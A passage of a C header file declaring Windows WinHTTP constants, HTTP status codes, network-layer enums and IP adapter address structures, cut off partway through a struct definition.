#define WINHTTP_QUERY_USER_AGENT                   39
#define WINHTTP_QUERY_WWW_AUTHENTICATE             40
#define WINHTTP_QUERY_PROXY_AUTHENTICATE           41
#define WINHTTP_QUERY_ACCEPT_RANGES                42
#define WINHTTP_QUERY_SET_COOKIE                   43
#define WINHTTP_QUERY_COOKIE                       44
#define WINHTTP_QUERY_REQUEST_METHOD               45
#define WINHTTP_QUERY_REFRESH                      46
#define WINHTTP_QUERY_CONTENT_DISPOSITION          47
#define WINHTTP_QUERY_AGE                          48
#define WINHTTP_QUERY_CACHE_CONTROL                49
#define WINHTTP_QUERY_CONTENT_BASE                 50
#define WINHTTP_QUERY_CONTENT_LOCATION             51
#define WINHTTP_QUERY_CONTENT_MD5                  52
#define WINHTTP_QUERY_CONTENT_RANGE                53
#define WINHTTP_QUERY_ETAG                         54
#define WINHTTP_QUERY_HOST                         55
#define WINHTTP_QUERY_IF_MATCH                     56
#define WINHTTP_QUERY_IF_NONE_MATCH                57
#define WINHTTP_QUERY_IF_RANGE                     58
#define WINHTTP_QUERY_IF_UNMODIFIED_SINCE          59
#define WINHTTP_QUERY_MAX_FORWARDS                 60
#define WINHTTP_QUERY_PROXY_AUTHORIZATION          61
#define WINHTTP_QUERY_RANGE                        62
#define WINHTTP_QUERY_TRANSFER_ENCODING            63
#define WINHTTP_QUERY_UPGRADE                      64
#define WINHTTP_QUERY_VARY                         65
#define WINHTTP_QUERY_VIA                          66
#define WINHTTP_QUERY_WARNING                      67
#define WINHTTP_QUERY_EXPECT                       68
#define WINHTTP_QUERY_PROXY_CONNECTION             69
#define WINHTTP_QUERY_UNLESS_MODIFIED_SINCE        70
#define WINHTTP_QUERY_PROXY_SUPPORT                75
#define WINHTTP_QUERY_AUTHENTICATION_INFO          76
#define WINHTTP_QUERY_PASSPORT_URLS                77
#define WINHTTP_QUERY_PASSPORT_CONFIG              78
#define WINHTTP_QUERY_MAX                          78
#define WINHTTP_QUERY_CUSTOM                       65535
#define WINHTTP_QUERY_FLAG_REQUEST_HEADERS         0x80000000
#define WINHTTP_QUERY_FLAG_SYSTEMTIME              0x40000000
#define WINHTTP_QUERY_FLAG_NUMBER                  0x20000000
#define WINHTTP_QUERY_FLAG_NUMBER64                0x08000000
/* flags for WinHttp{Set/Query}Options */
#define WINHTTP_FIRST_OPTION                         WINHTTP_OPTION_CALLBACK
#define WINHTTP_OPTION_CALLBACK                       1
#define WINHTTP_OPTION_RESOLVE_TIMEOUT                2
#define WINHTTP_OPTION_CONNECT_TIMEOUT                3
#define WINHTTP_OPTION_CONNECT_RETRIES                4
#define WINHTTP_OPTION_SEND_TIMEOUT                   5
#define WINHTTP_OPTION_RECEIVE_TIMEOUT                6
#define WINHTTP_OPTION_RECEIVE_RESPONSE_TIMEOUT       7
#define WINHTTP_OPTION_HANDLE_TYPE                    9
#define WINHTTP_OPTION_READ_BUFFER_SIZE              12
#define WINHTTP_OPTION_WRITE_BUFFER_SIZE             13
#define WINHTTP_OPTION_PARENT_HANDLE                 21
#define WINHTTP_OPTION_EXTENDED_ERROR                24
#define WINHTTP_OPTION_SECURITY_FLAGS                31
#define WINHTTP_OPTION_SECURITY_CERTIFICATE_STRUCT   32
#define WINHTTP_OPTION_URL                           34
#define WINHTTP_OPTION_SECURITY_KEY_BITNESS          36
#define WINHTTP_OPTION_PROXY                         38
#define WINHTTP_OPTION_PROXY_RESULT_ENTRY            39
#define WINHTTP_OPTION_USER_AGENT                    41
#define WINHTTP_OPTION_CONTEXT_VALUE                 45
#define WINHTTP_OPTION_CLIENT_CERT_CONTEXT           47
#define WINHTTP_OPTION_REQUEST_PRIORITY              58
#define WINHTTP_OPTION_HTTP_VERSION                  59
#define WINHTTP_OPTION_DISABLE_FEATURE               63
#define WINHTTP_OPTION_CODEPAGE                      68
#define WINHTTP_OPTION_MAX_CONNS_PER_SERVER          73
#define WINHTTP_OPTION_MAX_CONNS_PER_1_0_SERVER      74
#define WINHTTP_OPTION_AUTOLOGON_POLICY              77
#define WINHTTP_OPTION_SERVER_CERT_CONTEXT           78
#define WINHTTP_OPTION_ENABLE_FEATURE                79
#define WINHTTP_OPTION_WORKER_THREAD_COUNT           80
#define WINHTTP_OPTION_PASSPORT_COBRANDING_TEXT      81
#define WINHTTP_OPTION_PASSPORT_COBRANDING_URL       82
#define WINHTTP_OPTION_CONFIGURE_PASSPORT_AUTH       83
#define WINHTTP_OPTION_SECURE_PROTOCOLS              84
#define WINHTTP_OPTION_ENABLETRACING                 85
#define WINHTTP_OPTION_PASSPORT_SIGN_OUT             86
#define WINHTTP_OPTION_PASSPORT_RETURN_URL           87
#define WINHTTP_OPTION_REDIRECT_POLICY               88
#define WINHTTP_OPTION_MAX_HTTP_AUTOMATIC_REDIRECTS  89
#define WINHTTP_OPTION_MAX_HTTP_STATUS_CONTINUE      90
#define WINHTTP_OPTION_MAX_RESPONSE_HEADER_SIZE      91
#define WINHTTP_OPTION_MAX_RESPONSE_DRAIN_SIZE       92
#define WINHTTP_OPTION_CONNECTION_INFO               93
#define WINHTTP_OPTION_CLIENT_CERT_ISSUER_LIST       94
#define WINHTTP_OPTION_SPN                           96
#define WINHTTP_OPTION_GLOBAL_PROXY_CREDS            97
#define WINHTTP_OPTION_GLOBAL_SERVER_CREDS           98
#define WINHTTP_OPTION_UNLOAD_NOTIFY_EVENT           99
#define WINHTTP_OPTION_REJECT_USERPWD_IN_URL         100
#define WINHTTP_OPTION_USE_GLOBAL_SERVER_CREDENTIALS 101
#define WINHTTP_OPTION_RECEIVE_PROXY_CONNECT_RESPONSE   103
#define WINHTTP_OPTION_IS_PROXY_CONNECT_RESPONSE        104
#define WINHTTP_OPTION_SERVER_SPN_USED                  106
#define WINHTTP_OPTION_PROXY_SPN_USED                   107
#define WINHTTP_OPTION_SERVER_CBT                       108
#define WINHTTP_OPTION_UNSAFE_HEADER_PARSING            110
#define WINHTTP_OPTION_ASSURED_NON_BLOCKING_CALLBACKS   111
#define WINHTTP_OPTION_UPGRADE_TO_WEB_SOCKET            114
#define WINHTTP_OPTION_WEB_SOCKET_CLOSE_TIMEOUT         115
#define WINHTTP_OPTION_WEB_SOCKET_KEEPALIVE_INTERVAL    116
#define WINHTTP_OPTION_DECOMPRESSION                    118
#define WINHTTP_OPTION_WEB_SOCKET_RECEIVE_BUFFER_SIZE   122
#define WINHTTP_OPTION_WEB_SOCKET_SEND_BUFFER_SIZE      123
#define WINHTTP_OPTION_TCP_PRIORITY_HINT                128
#define WINHTTP_OPTION_CONNECTION_FILTER                131
#define WINHTTP_OPTION_ENABLE_HTTP_PROTOCOL             133
#define WINHTTP_OPTION_HTTP_PROTOCOL_USED               134
#define WINHTTP_OPTION_KDC_PROXY_SETTINGS               136
#define WINHTTP_OPTION_ENCODE_EXTRA                     138
#define WINHTTP_OPTION_DISABLE_STREAM_QUEUE             139
#define WINHTTP_OPTION_IPV6_FAST_FALLBACK               140
#define WINHTTP_OPTION_CONNECTION_STATS_V0              141
#define WINHTTP_OPTION_REQUEST_TIMES                    142
#define WINHTTP_OPTION_EXPIRE_CONNECTION                143
#define WINHTTP_OPTION_DISABLE_SECURE_PROTOCOL_FALLBACK 144
#define WINHTTP_OPTION_HTTP_PROTOCOL_REQUIRED           145
#define WINHTTP_OPTION_REQUEST_STATS                    146
#define WINHTTP_OPTION_SERVER_CERT_CHAIN_CONTEXT        147
#define WINHTTP_LAST_OPTION                          WINHTTP_OPTION_SERVER_CERT_CHAIN_CONTEXT
#define WINHTTP_OPTION_USERNAME                      0x1000
#define WINHTTP_OPTION_PASSWORD                      0x1001
#define WINHTTP_OPTION_PROXY_USERNAME                0x1002
#define WINHTTP_OPTION_PROXY_PASSWORD                0x1003

/* WinHttp status codes */
#define HTTP_STATUS_CONTINUE            100
#define HTTP_STATUS_SWITCH_PROTOCOLS    101
#define HTTP_STATUS_OK                  200
#define HTTP_STATUS_CREATED             201
#define HTTP_STATUS_ACCEPTED            202
#define HTTP_STATUS_PARTIAL             203
#define HTTP_STATUS_NO_CONTENT          204
#define HTTP_STATUS_RESET_CONTENT       205
#define HTTP_STATUS_PARTIAL_CONTENT     206
#define HTTP_STATUS_WEBDAV_MULTI_STATUS 207
#define HTTP_STATUS_AMBIGUOUS           300
#define HTTP_STATUS_MOVED               301
#define HTTP_STATUS_REDIRECT            302
#define HTTP_STATUS_REDIRECT_METHOD     303
#define HTTP_STATUS_NOT_MODIFIED        304
#define HTTP_STATUS_USE_PROXY           305
#define HTTP_STATUS_REDIRECT_KEEP_VERB  307
#define HTTP_STATUS_PERMANENT_REDIRECT  308
#define HTTP_STATUS_BAD_REQUEST         400
#define HTTP_STATUS_DENIED              401
#define HTTP_STATUS_PAYMENT_REQ         402
#define HTTP_STATUS_FORBIDDEN           403
#define HTTP_STATUS_NOT_FOUND           404
#define HTTP_STATUS_BAD_METHOD          405
#define HTTP_STATUS_NONE_ACCEPTABLE     406
#define HTTP_STATUS_PROXY_AUTH_REQ      407
#define HTTP_STATUS_REQUEST_TIMEOUT     408
#define HTTP_STATUS_CONFLICT            409
#define HTTP_STATUS_GONE                410
#define HTTP_STATUS_LENGTH_REQUIRED     411
#define HTTP_STATUS_PRECOND_FAILED      412
#define HTTP_STATUS_REQUEST_TOO_LARGE   413
#define HTTP_STATUS_URI_TOO_LONG        414
#define HTTP_STATUS_UNSUPPORTED_MEDIA   415
#define HTTP_STATUS_RETRY_WITH          449
#define HTTP_STATUS_SERVER_ERROR        500
#define HTTP_STATUS_NOT_SUPPORTED       501
#define HTTP_STATUS_BAD_GATEWAY         502
#define HTTP_STATUS_SERVICE_UNAVAIL     503
#define HTTP_STATUS_GATEWAY_TIMEOUT     504
#define HTTP_STATUS_VERSION_NOT_SUP     505
#define HTTP_STATUS_FIRST               HTTP_STATUS_CONTINUE
#define HTTP_STATUS_LAST                HTTP_STATUS_VERSION_NOT_SUP
#define MAX_ADAPTER_DESCRIPTION_LENGTH 128
#define MAX_ADAPTER_NAME_LENGTH 256
#define MAX_ADAPTER_ADDRESS_LENGTH 8
#define DEFAULT_MINIMUM_ENTITIES 32
#define MAX_HOSTNAME_LEN 128
#define MAX_DOMAIN_NAME_LEN 128
#define MAX_SCOPE_ID_LEN 256
#define MAX_DHCPV6_DUID_LENGTH 130
#define MAX_DNS_SUFFIX_STRING_LENGTH 256

#define BROADCAST_NODETYPE 1
#define PEER_TO_PEER_NODETYPE 2
#define MIXED_NODETYPE 4
#define HYBRID_NODETYPE 8


typedef enum {
  IpPrefixOriginOther = 0,
  IpPrefixOriginManual,
  IpPrefixOriginWellKnown,
  IpPrefixOriginDhcp,
  IpPrefixOriginRouterAdvertisement,
  IpPrefixOriginUnchanged = 16 
} NL_PREFIX_ORIGIN;

typedef enum {
  NlsoOther = 0,
  NlsoManual,
  NlsoWellKnown,
  NlsoDhcp,
  NlsoLinkLayerAddress,
  NlsoRandom,
  IpSuffixOriginOther = 0,
  IpSuffixOriginManual,
  IpSuffixOriginWellKnown,
  IpSuffixOriginDhcp,
  IpSuffixOriginLinkLayerAddress,
  IpSuffixOriginRandom,
  IpSuffixOriginUnchanged = 16
} NL_SUFFIX_ORIGIN;

typedef enum {
  NlatUnspecified,
  NlatUnicast,
  NlatAnycast,
  NlatMulticast,
  NlatBroadcast,
  NlatInvalid
} NL_ADDRESS_TYPE, *PNL_ADDRESS_TYPE;

typedef enum _NL_ROUTE_ORIGIN {
  NlroManual,
  NlroWellKnown,
  NlroDHCP,
  NlroRouterAdvertisement,
  Nlro6to4,
} NL_ROUTE_ORIGIN, *PNL_ROUTE_ORIGIN;

typedef enum _NL_NEIGHBOR_STATE {
  NlnsUnreachable,
  NlnsIncomplete,
  NlnsProbe,
  NlnsDelay,
  NlnsStale,
  NlnsReachable,
  NlnsPermanent,
  NlnsMaximum,
} NL_NEIGHBOR_STATE, *PNL_NEIGHBOR_STATE;

typedef enum _NL_LINK_LOCAL_ADDRESS_BEHAVIOR {
  LinkLocalAlwaysOff = 0,
  LinkLocalDelayed,
  LinkLocalAlwaysOn,
  LinkLocalUnchanged = -1
} NL_LINK_LOCAL_ADDRESS_BEHAVIOR;

typedef enum _NL_ROUTER_DISCOVERY_BEHAVIOR {
  RouterDiscoveryDisabled = 0,
  RouterDiscoveryEnabled,
  RouterDiscoveryDhcp,
  RouterDiscoveryUnchanged = -1
} NL_ROUTER_DISCOVERY_BEHAVIOR;

typedef enum _NL_BANDWIDTH_FLAG {
  NlbwDisabled = 0,
  NlbwEnabled,
  NlbwUnchanged = -1
} NL_BANDWIDTH_FLAG, *PNL_BANDWIDTH_FLAG;

typedef enum _NL_INTERFACE_NETWORK_CATEGORY_STATE {
  NlincCategoryUnknown = 0,
  NlincPublic = 1,
  NlincPrivate = 2,
  NlincDomainAuthenticated = 3,
  NlincCategoryStateMax
} NL_INTERFACE_NETWORK_CATEGORY_STATE, *PNL_INTERFACE_NETWORK_CATEGORY_STATE;

typedef struct _NL_INTERFACE_OFFLOAD_ROD {
  BOOLEAN NlChecksumSupported : 1;
  BOOLEAN NlOptionsSupported : 1;
  BOOLEAN TlDatagramChecksumSupported : 1;
  BOOLEAN TlStreamChecksumSupported : 1;
  BOOLEAN TlStreamOptionsSupported : 1;
  BOOLEAN FastPathCompatible : 1;
  BOOLEAN TlLargeSendOffloadSupported : 1;
  BOOLEAN TlGiantSendOffloadSupported : 1;
} NL_INTERFACE_OFFLOAD_ROD, *PNL_INTERFACE_OFFLOAD_ROD;

typedef struct _NL_PATH_BANDWIDTH_ROD {
  ULONG64 Bandwidth;
  ULONG64 Instability;
  BOOLEAN BandwidthPeaked;
} NL_PATH_BANDWIDTH_ROD, *PNL_PATH_BANDWIDTH_ROD;

typedef enum _NL_NETWORK_CATEGORY {
  NetworkCategoryPublic,
  NetworkCategoryPrivate,
  NetworkCategoryDomainAuthenticated,
  NetworkCategoryUnchanged = -1,
  NetworkCategoryUnknown = -1
} NL_NETWORK_CATEGORY,*PNL_NETWORK_CATEGORY;

typedef struct _NL_BANDWIDTH_INFORMATION {
  ULONG64 Bandwidth;
  ULONG64 Instability;
  BOOLEAN BandwidthPeaked;
} NL_BANDWIDTH_INFORMATION, *PNL_BANDWIDTH_INFORMATION;

typedef enum {
  NldsInvalid,
  NldsTentative,
  NldsDuplicate,
  NldsDeprecated,
  NldsPreferred,
  IpDadStateInvalid = 0,
  IpDadStateTentative,
  IpDadStateDuplicate,
  IpDadStateDeprecated,
  IpDadStatePreferred,
} NL_DAD_STATE;
typedef UINT32 NET_IF_COMPARTMENT_ID, *PNET_IF_COMPARTMENT_ID;

typedef ULONG NET_IFINDEX, *PNET_IFINDEX;
typedef UINT16 NET_IFTYPE, *PNET_IFTYPE;
typedef NET_IFINDEX IF_INDEX, *PIF_INDEX;

typedef GUID NET_IF_NETWORK_GUID;

#define IF_MAX_STRING_SIZE 256
#define IF_MAX_PHYS_ADDRESS_LENGTH 32

typedef enum _IF_OPER_STATUS {
  IfOperStatusUp               = 1,
  IfOperStatusDown,
  IfOperStatusTesting,
  IfOperStatusUnknown,
  IfOperStatusDormant,
  IfOperStatusNotPresent,
  IfOperStatusLowerLayerDown 
} IF_OPER_STATUS;

typedef enum _NET_IF_OPER_STATUS {
  NET_IF_OPER_STATUS_UP                = 1,
  NET_IF_OPER_STATUS_DOWN,
  NET_IF_OPER_STATUS_TESTING,
  NET_IF_OPER_STATUS_UNKNOWN,
  NET_IF_OPER_STATUS_DORMANT,
  NET_IF_OPER_STATUS_NOT_PRESENT,
  NET_IF_OPER_STATUS_LOWER_LAYER_DOWN
} NET_IF_OPER_STATUS, *PNET_IF_OPER_STATUS;

typedef enum _NET_IF_ADMIN_STATUS {
  NET_IF_ADMIN_STATUS_UP        = 1,
  NET_IF_ADMIN_STATUS_DOWN,
  NET_IF_ADMIN_STATUS_TESTING 
} NET_IF_ADMIN_STATUS, *PNET_IF_ADMIN_STATUS;

typedef enum _NET_IF_MEDIA_CONNECT_STATE {
  MediaConnectStateUnknown,
  MediaConnectStateConnected,
  MediaConnectStateDisconnected 
} NET_IF_MEDIA_CONNECT_STATE, *PNET_IF_MEDIA_CONNECT_STATE;

typedef enum _NET_IF_ACCESS_TYPE {
  NET_IF_ACCESS_LOOPBACK               = 1,
  NET_IF_ACCESS_BROADCAST,
  NET_IF_ACCESS_POINT_TO_POINT,
  NET_IF_ACCESS_POINT_TO_MULTI_POINT,
  NET_IF_ACCESS_MAXIMUM 
} NET_IF_ACCESS_TYPE, *PNET_IF_ACCESS_TYPE;

typedef enum _NET_IF_CONNECTION_TYPE {
  NET_IF_CONNECTION_DEDICATED   = 1,
  NET_IF_CONNECTION_PASSIVE,
  NET_IF_CONNECTION_DEMAND,
  NET_IF_CONNECTION_MAXIMUM 
} NET_IF_CONNECTION_TYPE, *PNET_IF_CONNECTION_TYPE;

typedef enum _NET_IF_DIRECTION_TYPE {
  NET_IF_DIRECTION_SENDRECEIVE,
  NET_IF_DIRECTION_SENDONLY,
  NET_IF_DIRECTION_RECEIVEONLY,
  NET_IF_DIRECTION_MAXIMUM 
} NET_IF_DIRECTION_TYPE, *PNET_IF_DIRECTION_TYPE;

typedef enum _NET_IF_MEDIA_DUPLEX_STATE {
  MediaDuplexStateUnknown,
  MediaDuplexStateHalf,
  MediaDuplexStateFull 
} NET_IF_MEDIA_DUPLEX_STATE, *PNET_IF_MEDIA_DUPLEX_STATE;

typedef enum _TUNNEL_TYPE {
  TUNNEL_TYPE_NONE      = 0,
  TUNNEL_TYPE_OTHER     = 1,
  TUNNEL_TYPE_DIRECT    = 2,
  TUNNEL_TYPE_6TO4      = 11,
  TUNNEL_TYPE_ISATAP    = 13,
  TUNNEL_TYPE_TEREDO    = 14,
  TUNNEL_TYPE_IPHTTPS   = 15
} TUNNEL_TYPE, *PTUNNEL_TYPE;

typedef union _NET_LUID {
  ULONG64 Value;
  __C89_NAMELESS struct { /* bitfield with 64 bit types. */
    ULONG64 Reserved  :24;
    ULONG64 NetLuidIndex  :24;
    ULONG64 IfType  :16;
  } Info;
} NET_LUID, *PNET_LUID;

typedef NET_LUID IF_LUID, *PIF_LUID;

typedef struct _IF_COUNTED_STRING_LH {
    USHORT Length;
    WCHAR  String[IF_MAX_STRING_SIZE + 1];
} IF_COUNTED_STRING_LH, *PIF_COUNTED_STRING_LH;
typedef IF_COUNTED_STRING_LH IF_COUNTED_STRING;
typedef IF_COUNTED_STRING *PIF_COUNTED_STRING;

typedef struct _IF_PHYSICAL_ADDRESS_LH {
    USHORT Length;
    UCHAR  Address[IF_MAX_PHYS_ADDRESS_LENGTH];
} IF_PHYSICAL_ADDRESS_LH, *PIF_PHYSICAL_ADDRESS_LH;
typedef IF_PHYSICAL_ADDRESS_LH IF_PHYSICAL_ADDRESS;
typedef IF_PHYSICAL_ADDRESS *PIF_PHYSICAL_ADDRESS;


  typedef struct {
    char String[4*4];
  } IP_ADDRESS_STRING,*PIP_ADDRESS_STRING,IP_MASK_STRING,*PIP_MASK_STRING;

  typedef struct _IP_ADDR_STRING {
    struct _IP_ADDR_STRING *Next;
    IP_ADDRESS_STRING IpAddress;
    IP_MASK_STRING IpMask;
    DWORD Context;
  } IP_ADDR_STRING,*PIP_ADDR_STRING;

  typedef struct _IP_ADAPTER_INFO {
    struct _IP_ADAPTER_INFO *Next;
    DWORD ComboIndex;
    char AdapterName[MAX_ADAPTER_NAME_LENGTH + 4];
    char Description[MAX_ADAPTER_DESCRIPTION_LENGTH + 4];
    UINT AddressLength;
    BYTE Address[MAX_ADAPTER_ADDRESS_LENGTH];
    DWORD Index;
    UINT Type;
    UINT DhcpEnabled;
    PIP_ADDR_STRING CurrentIpAddress;
    IP_ADDR_STRING IpAddressList;
    IP_ADDR_STRING GatewayList;
    IP_ADDR_STRING DhcpServer;
    WINBOOL HaveWins;
    IP_ADDR_STRING PrimaryWinsServer;
    IP_ADDR_STRING SecondaryWinsServer;
    time_t LeaseObtained;
    time_t LeaseExpires;
  } IP_ADAPTER_INFO,*PIP_ADAPTER_INFO;
  typedef struct _SOCKET_ADDRESS {
    LPSOCKADDR lpSockaddr;
    INT iSockaddrLength;
  } SOCKET_ADDRESS,*PSOCKET_ADDRESS,*LPSOCKET_ADDRESS;

  typedef struct _CSADDR_INFO {
    SOCKET_ADDRESS LocalAddr;
    SOCKET_ADDRESS RemoteAddr;
    INT iSocketType;
    INT iProtocol;
  } CSADDR_INFO,*PCSADDR_INFO,*LPCSADDR_INFO;
  typedef NL_PREFIX_ORIGIN IP_PREFIX_ORIGIN;
  typedef NL_SUFFIX_ORIGIN IP_SUFFIX_ORIGIN;
  typedef NL_DAD_STATE IP_DAD_STATE;

  typedef struct _IP_ADAPTER_UNICAST_ADDRESS_XP {
    __C89_NAMELESS union {
      ULONGLONG Alignment;
      __C89_NAMELESS struct {
	ULONG Length;
	DWORD Flags;
      };
    };
    struct _IP_ADAPTER_UNICAST_ADDRESS_XP *Next;
    SOCKET_ADDRESS Address;
    IP_PREFIX_ORIGIN PrefixOrigin;
    IP_SUFFIX_ORIGIN SuffixOrigin;
    IP_DAD_STATE DadState;
    ULONG ValidLifetime;
    ULONG PreferredLifetime;
    ULONG LeaseLifetime;
  } IP_ADAPTER_UNICAST_ADDRESS_XP,*PIP_ADAPTER_UNICAST_ADDRESS_XP;

  typedef struct _IP_ADAPTER_UNICAST_ADDRESS_LH {
    __C89_NAMELESS union {
      ULONGLONG Alignment;
      __C89_NAMELESS struct {
	ULONG Length;
	DWORD Flags;
      };
    };
    struct _IP_ADAPTER_UNICAST_ADDRESS_LH *Next;
    SOCKET_ADDRESS Address;
    IP_PREFIX_ORIGIN PrefixOrigin;
    IP_SUFFIX_ORIGIN SuffixOrigin;
    IP_DAD_STATE DadState;
    ULONG ValidLifetime;
    ULONG PreferredLifetime;
    ULONG LeaseLifetime;
    UINT8 OnLinkPrefixLength;
  } IP_ADAPTER_UNICAST_ADDRESS_LH,*PIP_ADAPTER_UNICAST_ADDRESS_LH;

#if (_WIN32_WINNT >= 0x0600)
  typedef IP_ADAPTER_UNICAST_ADDRESS_LH   IP_ADAPTER_UNICAST_ADDRESS;
  typedef IP_ADAPTER_UNICAST_ADDRESS_LH *PIP_ADAPTER_UNICAST_ADDRESS;
#else /* _WIN32_WINNT >= 0x0501 */
  typedef IP_ADAPTER_UNICAST_ADDRESS_XP   IP_ADAPTER_UNICAST_ADDRESS;
  typedef IP_ADAPTER_UNICAST_ADDRESS_XP *PIP_ADAPTER_UNICAST_ADDRESS;
#endif

  typedef struct _IP_ADAPTER_ANYCAST_ADDRESS_XP {
    __C89_NAMELESS union {
      ULONGLONG Alignment;
      __C89_NAMELESS struct {
	ULONG Length;
	DWORD Flags;
      };
    };
    struct _IP_ADAPTER_ANYCAST_ADDRESS_XP *Next;
    SOCKET_ADDRESS Address;
  } IP_ADAPTER_ANYCAST_ADDRESS_XP,*PIP_ADAPTER_ANYCAST_ADDRESS_XP;
  typedef IP_ADAPTER_ANYCAST_ADDRESS_XP   IP_ADAPTER_ANYCAST_ADDRESS;
  typedef IP_ADAPTER_ANYCAST_ADDRESS_XP *PIP_ADAPTER_ANYCAST_ADDRESS;

  typedef struct _IP_ADAPTER_MULTICAST_ADDRESS_XP {
    __C89_NAMELESS union {
      ULONGLONG Alignment;
      __C89_NAMELESS struct {
	ULONG Length;
	DWORD Flags;
      };
    };
    struct _IP_ADAPTER_MULTICAST_ADDRESS_XP *Next;
    SOCKET_ADDRESS Address;
  } IP_ADAPTER_MULTICAST_ADDRESS_XP,*PIP_ADAPTER_MULTICAST_ADDRESS_XP;
  typedef IP_ADAPTER_MULTICAST_ADDRESS_XP   IP_ADAPTER_MULTICAST_ADDRESS;
  typedef IP_ADAPTER_MULTICAST_ADDRESS_XP *PIP_ADAPTER_MULTICAST_ADDRESS;

#define IP_ADAPTER_ADDRESS_DNS_ELIGIBLE 0x01
#define IP_ADAPTER_ADDRESS_TRANSIENT 0x02
#define IP_ADAPTER_ADDRESS_PRIMARY 0x04

  typedef struct _IP_ADAPTER_DNS_SERVER_ADDRESS_XP {
    __C89_NAMELESS union {
      ULONGLONG Alignment;
      __C89_NAMELESS struct {
	ULONG Length;
	DWORD Reserved;
      };
    };
    struct _IP_ADAPTER_DNS_SERVER_ADDRESS_XP *Next;
    SOCKET_ADDRESS Address;
  } IP_ADAPTER_DNS_SERVER_ADDRESS_XP,*PIP_ADAPTER_DNS_SERVER_ADDRESS_XP;
  typedef IP_ADAPTER_DNS_SERVER_ADDRESS_XP   IP_ADAPTER_DNS_SERVER_ADDRESS;
  typedef IP_ADAPTER_DNS_SERVER_ADDRESS_XP *PIP_ADAPTER_DNS_SERVER_ADDRESS;

  typedef struct _IP_ADAPTER_PREFIX_XP {
    __C89_NAMELESS union {
      ULONGLONG Alignment;
      __C89_NAMELESS struct {
	ULONG Length;
	DWORD Flags;
      };
    };
    struct _IP_ADAPTER_PREFIX_XP *Next;
    SOCKET_ADDRESS Address;
    ULONG PrefixLength;
  } IP_ADAPTER_PREFIX_XP,*PIP_ADAPTER_PREFIX_XP;
  typedef IP_ADAPTER_PREFIX_XP   IP_ADAPTER_PREFIX;
  typedef IP_ADAPTER_PREFIX_XP *PIP_ADAPTER_PREFIX;

  typedef struct _IP_ADAPTER_WINS_SERVER_ADDRESS_LH {
    __C89_NAMELESS union {
      ULONGLONG Alignment;
      __C89_NAMELESS struct {
	ULONG Length;
	DWORD Reserved;
      };
    };
    struct _IP_ADAPTER_WINS_SERVER_ADDRESS_LH *Next;
    SOCKET_ADDRESS Address;
  } IP_ADAPTER_WINS_SERVER_ADDRESS_LH,*PIP_ADAPTER_WINS_SERVER_ADDRESS_LH;
#if (_WIN32_WINNT >= 0x0600)
  typedef IP_ADAPTER_WINS_SERVER_ADDRESS_LH   IP_ADAPTER_WINS_SERVER_ADDRESS;
  typedef IP_ADAPTER_WINS_SERVER_ADDRESS_LH *PIP_ADAPTER_WINS_SERVER_ADDRESS;
#endif
typedef int (WINAPI *pGetKeyboardLayoutList)(int nBuff,HKL *lpList);
  typedef struct _IP_ADAPTER_GATEWAY_ADDRESS_LH {
    __C89_NAMELESS union {
      ULONGLONG Alignment;
      __C89_NAMELESS struct {
	ULONG Length;
	DWORD Reserved;
      };
    };
    struct _IP_ADAPTER_GATEWAY_ADDRESS_LH *Next;
    SOCKET_ADDRESS Address;
  } IP_ADAPTER_GATEWAY_ADDRESS_LH,*PIP_ADAPTER_GATEWAY_ADDRESS_LH;
#if (_WIN32_WINNT >= 0x0600)
  typedef IP_ADAPTER_GATEWAY_ADDRESS_LH   IP_ADAPTER_GATEWAY_ADDRESS;
  typedef IP_ADAPTER_GATEWAY_ADDRESS_LH *PIP_ADAPTER_GATEWAY_ADDRESS;
#endif

  typedef struct _IP_ADAPTER_DNS_SUFFIX {
    struct _IP_ADAPTER_DNS_SUFFIX *Next;
    WCHAR String[MAX_DNS_SUFFIX_STRING_LENGTH];
  } IP_ADAPTER_DNS_SUFFIX, *PIP_ADAPTER_DNS_SUFFIX;

#define IP_ADAPTER_DDNS_ENABLED 0x01
#define IP_ADAPTER_REGISTER_ADAPTER_SUFFIX 0x02
#define IP_ADAPTER_DHCP_ENABLED 0x04
#define IP_ADAPTER_RECEIVE_ONLY 0x08
#define IP_ADAPTER_NO_MULTICAST 0x10
#define IP_ADAPTER_IPV6_OTHER_STATEFUL_CONFIG 0x20
#define IP_ADAPTER_NETBIOS_OVER_TCPIP_ENABLED 0x40
#define IP_ADAPTER_IPV4_ENABLED 0x80
#define IP_ADAPTER_IPV6_ENABLED 0x100
#define IP_ADAPTER_IPV6_MANAGE_ADDRESS_CONFIG 0x200

  typedef struct _IP_ADAPTER_ADDRESSES_LH {
    __C89_NAMELESS union {
      ULONGLONG   Alignment;
      __C89_NAMELESS struct {
	ULONG Length;
	IF_INDEX IfIndex;
      };
    };
    struct _IP_ADAPTER_ADDRESSES_LH *Next;
    PCHAR AdapterName;
    PIP_ADAPTER_UNICAST_ADDRESS_LH    FirstUnicastAddress;
    PIP_ADAPTER_ANYCAST_ADDRESS_XP    FirstAnycastAddress;
    PIP_ADAPTER_MULTICAST_ADDRESS_XP  FirstMulticastAddress;
    PIP_ADAPTER_DNS_SERVER_ADDRESS_XP FirstDnsServerAddress;
    PWCHAR DnsSuffix;
    PWCHAR Description;
    PWCHAR FriendlyName;
    BYTE PhysicalAddress[MAX_ADAPTER_ADDRESS_LENGTH];
    ULONG PhysicalAddressLength;
    __C89_NAMELESS union {
      ULONG Flags;
      __C89_NAMELESS struct {
	ULONG DdnsEnabled : 1;
	ULONG RegisterAdapterSuffix : 1;
	ULONG Dhcpv4Enabled : 1;
	ULONG ReceiveOnly : 1;
	ULONG NoMulticast : 1;
	ULONG Ipv6OtherStatefulConfig : 1;
	ULONG NetbiosOverTcpipEnabled : 1;
	ULONG Ipv4Enabled : 1;
	ULONG Ipv6Enabled : 1;
	ULONG Ipv6ManagedAddressConfigurationSupported : 1;
      };
    };
    ULONG Mtu;
    ULONG IfType;
    IF_OPER_STATUS OperStatus;
    IF_INDEX Ipv6IfIndex;
    ULONG ZoneIndices[16];
    PIP_ADAPTER_PREFIX_XP FirstPrefix;

    ULONG64 TransmitLinkSpeed;
    ULONG64 ReceiveLinkSpeed;
    PIP_ADAPTER_WINS_SERVER_ADDRESS_LH FirstWinsServerAddress;
    PIP_ADAPTER_GATEWAY_ADDRESS_LH     FirstGatewayAddress;
    ULONG Ipv4Metric;
    ULONG Ipv6Metric;
    IF_LUID Luid;
    SOCKET_ADDRESS Dhcpv4Server;
    NET_IF_COMPARTMENT_ID CompartmentId;
    NET_IF_NETWORK_GUID NetworkGuid;
    NET_IF_CONNECTION_TYPE ConnectionType;
    TUNNEL_TYPE TunnelType;

